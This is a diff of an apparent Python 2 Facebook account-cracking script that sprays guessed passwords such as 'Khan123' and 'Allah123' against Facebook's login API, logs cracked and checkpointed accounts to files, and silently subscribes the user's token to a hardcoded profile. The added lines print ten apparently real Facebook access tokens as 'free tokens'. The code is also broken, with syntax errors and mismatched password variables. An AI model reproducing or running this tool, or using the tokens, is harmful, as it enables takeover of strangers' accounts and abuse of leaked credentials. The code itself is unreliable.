@@ -1,6 +1,6 @@
  #coding:utf-8
 #!/user/bin/python2
-#coding by S-Zakarya
+#coding by Zakarya
 try:    
     import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
     from multiprocessing.pool import ThreadPool
@@ -11,7 +11,7 @@ except ImportError:
     os.system('pip2 install mechanize')
     os.system('python2 Acid.py')
 try:
-    os.mkdir('ACID')
+    os.mkdir('FUCK')
 except OSError:
     pass
 
@@ -44,24 +44,23 @@ Y='\033[1;93m'
 
 #Dev:Sayyed_Zakarya
 #### LOGO ####
-logo = """            
- \033[1;97m
- \033[1;96m▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄   ▄▄ ▄▄   ▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄  
- \033[1;91m█       █      █  █ █  █  █ █  █       █      █ 
- \033[1;92m█  ▄▄▄▄▄█  ▄   █  █▄█  █  █▄█  █    ▄▄▄█  ▄    █
- \033[1;93m█ █▄▄▄▄▄█ █▄█  █       █       █   █▄▄▄█ █ █   █
- \033[1;95m█▄▄▄▄▄  █      █▄     ▄█▄     ▄█    ▄▄▄█ █▄█   █
- \033[1;96m ▄▄▄▄▄█ █  ▄   █ █   █   █   █ █   █▄▄▄█       █
- \033[1;96m█▄▄▄▄▄▄▄█▄█ █▄▄█ █▄▄▄█   █▄▄▄█ █▄▄▄▄▄▄▄█▄▄▄▄▄▄█ 
-
-                                           
-                                            
-\033[1;96m███████╗ █████╗ ██╗  ██╗ █████╗ ██████╗ ██╗   ██╗ █████╗ 
-\033[1;95m╚══███╔╝██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗╚██╗ ██╔╝██╔══██╗
-\033[1;94m  ███╔╝ ███████║█████╔╝ ███████║██████╔╝ ╚████╔╝ ███████║
-\033[1;93m ███╔╝  ██╔══██║██╔═██╗ ██╔══██║██╔══██╗  ╚██╔╝  ██╔══██║
-\033[1;92m███████╗██║  ██║██║  ██╗██║  ██║██║  ██║   ██║   ██║  ██║
-\033[1;91m╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝
+logo = """                          
+\033[1;94m  ___   _____  _     _  _     _  ___    ___   
+\033[1;91m(  _ \(  _  )( )   ( )( )   ( )(  _ \ (  _ \ 
+\033[1;92m | (_(_) (_) | \ \_/ /  \ \_/ / | (_(_)| | ) |
+\033[1;93m  \__ \(  _  )   \ /      \ /   |  _)_ | | | )
+\033[1;95m ( )_) | | | |   | |      | |   | (_( )| |_) |
+\033[1;97m  \(___)_) (_)   (_)      (_)   (____/ (____/ 
+\033[1;94m  (_)                                         
+\033[1;96m
+\033[1;94m  _______ _____  _   _ _____  ___    _     _ _____ 
+\033[1;92m (_____  )  _  )( ) ( )  _  )|  _ \ ( )   ( )  _  )
+\033[1;93m      / /| (_) || |/ /| (_) || (_) ) \ \_/ /| (_) |
+\033[1;95m    / /  (  _  )|   ( (  _  )|    /    \ /  (  _  )
+\033[1;94m  / / ___| | | || |\ \| | | || |\ \    | |  | | | |
+\033[1;96m (_______)_) (_)( ) (_)_) (_)(_) (_)   (_)  (_) (_)
+\033[1;97m                /(                                 
+\033[1;94m               (__)                                                                            
 """
 CorrectUsername = "Sayyed"
 CorrectPassword = "Zakarya"
@@ -87,10 +86,11 @@ def logmen():
     os.system('clear')
     print logo
     print ' [1] Login Token'
+    print ' [2] Get Free Token
     print ' [\x1b[91m0\x1b[0m] Exit Tool'
     pilog()
 def pilog():
-    og = raw_input("\nSelect: ")
+    og = raw_input("\nZKI: ")
     if og =="1":
         os.system("clear")
         print logo
@@ -102,6 +102,41 @@ def pilog():
         print ("\r\033[1;32m[✓] Login Succesfully\033[0;97m")
         time.sleep(1)
         bot_fl()
+        elif og ==" 2":
+        print 
+        logo="""
+ Token No 1
+
+EAAAAUaZA8jlABAFJSFhiG1E3EhbRtzldAcYO2ZC0IFsRr0xXbtaBFBvajLoZA6h4ptDpgZBnxx7T7FaGtrWY6BZBDjkrmwVn85gpJZC7WUseC0SKqhuXWad8VLug8t6DPclZBKjIMsEByeQVU2tWb4e23cJ14aBvSrCGpDPMpmLwZAkNlejJDe0BlquZA8w6tyvcZD
+
+ Token No 2
+
+EAAAAUaZA8jlABAJG16Q43JxgMU7ZCM15CfxarUlCKCOPja0vsgwL2wU8l9pccRJtSjHFQtl0VRe2wYTbX0Q4a2QHLSC3J8ERPdF9JnZARyqsBIjCHRnvJSSWLwa9r619dxFWpkZCHOfZCZAZCkW7YI6ahZAx7d6efkOn4OQ1fGflwfZA9yHPymaNgnvRwve3R7gwZD
+
+ Token No 3
+EAAAAUaZA8jlABAAEZBfLBJqy1wcYLWoyTA7ybcUFBh8PivYocWqULQvLIO67AFUiEgXDOB3jXDmO1AfuCrwXHxZCyOxi2WrM6XE0ZCfZB8106w4X4JZCvZBWBrIlNFAy9ZC0iHJb5GbIpEJTS1cDcLAN8JiGohgSEeAp0NkPEZBF7qcXwCh2jDhD6PN29WZBmZB7M8
+
+ Token No 4
+EAAAAUaZA8jlABAFQtEdT93913TLUr7amsfmhG626dHdiCS8TSTZCrS3WF75I6ws5DIhHRpfvZABsY3ZBZA8xtQBr07g1GlAgAm9fTPtWFZBkEPuRcSykoG29ps93FeyUPYLO9EZCmwJKaDC34Adtfw9UhwyZCAsAzsbg10x6AnF4ZAsjZCUVvKiqEkVlZCgiC4pq70ZD
+
+ Token No 5
+EAAAAUaZA8jlABAFkG7vMxCYgTbJffsscQr81AZAGuUuI53rFtJw5l8d8B8KFZAZC6WaZBGNlEpeKr6vZBdAGtI1d4P7K1ZANqybcXiM6N3uYV7pj3OaZCcoEnXWcpcVdxgqaSvYZAvsvKjS5gy3RzqfidnJRAsDxrsu1zNS9NWdTPE0AzFThU1HZA2
+
+ Token No 6
+EAAAAUaZA8jlABAEfw8ZB3QDG0S5JT1mhtrywBwqNfZAn6x2FzwwxGbi1LpdUjDvFZCd2D2fgvLFnnVPtVQZCbMb1fYqqT0Cps80c6F6Ol8OQbdcvXYHGGgReN9SBDU6zmlVZBWCj1ZBnxkZA239ZBZCJw56iiaemOrn5Ng9WaB79iLYxiCxN6iYd8EFnOLZCAfd58UZD
+
+ Token No 7
+EAAAAUaZA8jlABAHwl2zyIWGPyQ588SFvkoV5YwxdGQiCb1FEGxnVP6RZCM8Mk34UsedfSRkcMSUeGFX79nu7E0guCmmRI2vtTqDOi8zoIIL506ZBNCRFhXq8srDL4aIwKJzepP9OYyQMJZClqsZBRNWKTPSF47ALYEhira99sZASVXbtaZBAzslUeY5KdZCCEGUZD
+
+ Token No 8
+EAAAAUaZA8jlABADnu0YhuZAewgeVOcZCNf1tDxVWnMhiMF6wVOwHIMolqQZA8G3yLnhUOswVSY8rehNpldW2cWYYzXtqdE6eQtB0wfWVfqhd1ZBTBsdqFTkvzGXdL5hNqq9qjkIBPkRTvql5cZCy4ytbeEwWdaYUhwqj8OcBK42eV0AxRCvu1TvSxn3t4e4
+
+ Token No 9
+EAAAAUaZA8jlABADE0UlMZB9sHz2mt1TO4UABZBGL68X3dk8XUmGvBf7KOpaBeZBPwMMQHDcQfuZCQwqLkXL8wCZCtazvLSimCQZCQbZChwzZAjJZBvma6HMemJp2GzyX00wvzY6wlbfJm7mGaktSEJXhGUKfXcoDofg4m7o0CPqJBekjGsoNiSTJpe1kAV5bnFANEZD
+
+ Token No 10
+EAAAAUaZA8jlABAGuUuqZCKpJlU9ZCJhHwuhyZCHsaBDjrxvuxMx6JHxdtQaTWg7HvEcMJBOPaw0Wo187IaVvP2Sx8CORxD2wD3FcYzYuqd0EFh2Rn8y8BVjYBjtlV3KOaWwmUwvuf3znjI3sdvjuuGGCm5T8GpVAAJgCgdnkBGlsMGFT6LFCjyhWTueN6c4ZD
+"""
     elif og =="0":
         exit()
     else:
@@ -114,7 +149,7 @@ def bot_fl():
     except IOError:
         print '\x1b[1;97m   [!] Token invalid'
         os.system('rm -rf .logfuck.txt')
-    requests.post('https://graph.facebook.com/sayyed.302/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100001027764318/subscribers?access_token=' + token)
     menu()
     
 def menu():
@@ -178,7 +213,7 @@ def cramen():
 	crapil()
 	
 def crapil():
-	select = raw_input("\nSelect: ")
+	select = raw_input("\nZKI: ")
 	id=[]
 	oks=[]
 	cps=[]
@@ -330,8 +365,8 @@ def crapil():
 		                                                    ok.close()
 		                                                    oks.append(uid)
 		                                                else:
-		                                                    pass7="889900"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
+		                                                    pass7= "889900"
+		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
 		                                                    if 'www.facebook.com' in d['error_msg']:
 		                                                        print("- "+uid+" | "+pass7+" --> CP")
@@ -346,432 +381,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass7+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-							        else:
-		                                                    pass8=name+"786"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass8 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass8+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass8+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass8+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-						                else:
-		                                                    pass9= "Khan123"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass9 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass9+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass9+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass9+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-				     		                else:
-		                                                    pass10= "000786"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass10 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass10+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass10+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass10+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-						                else:
-		                                                    pass11= "Bacha123"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass11 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass11+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass11+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass11+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-								else:
-		                                                    pass12= "India123"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass12 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass12+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass12+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass12+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-								else:
-		                                                    pass13= "Indonesia"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass13 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass13+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass13+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass13+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-		       					        else:
-		                                                    pass14= "Freefire"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass14 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass14+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass14+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass14+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-								else:
-		                                                    pass15= "Ali1234"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass15 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass15+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass15+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass15+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-								else:
-		                                                    pass16= "Pubglover"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass16 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass16+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass16+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass16+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-							        else:
-		                                                    pass17= "Allah123"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass17 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass17+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass17+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass17+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-							        else:
-		                                                    pass18= "Love123"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass18 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass18+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass18+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass18+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-								else:
-		                                                    pass19= "Fuck123"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass19 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass19+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass19+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass19+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-								else:
-		                                                    pass20= "Muhammad"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass20 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass20+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass20+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass20+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-							        else:
-		                                                    pass21= "Hacker123"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass21 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass21+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass21+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass21+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-								else:
-		                                                    pass22= "Pakarmy"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass22 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass22+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass22+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass22+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-								else:
-		                                                    pass23= "Swabi123"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass23 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass23+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass23+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass23+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-								else:
-		                                                    pass24= "Mardan123"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass24 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass24+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass24+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass24+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-								else:
-		                                                    pass25= "Swat123"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass25 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass26+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass26+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass26+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-								else:
-		                                                    pass27= "Karachi"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass26 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass27+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass27+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass27+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-								else:
-		                                                    pass28= "Lahore12"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass27 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass28+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass28+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass28+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-		                                                else:
-		                                                    pass29= "Shah123"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass28 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass29+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass29+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass29+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-						                else:
-		                                                    pass30= "Zaman123"
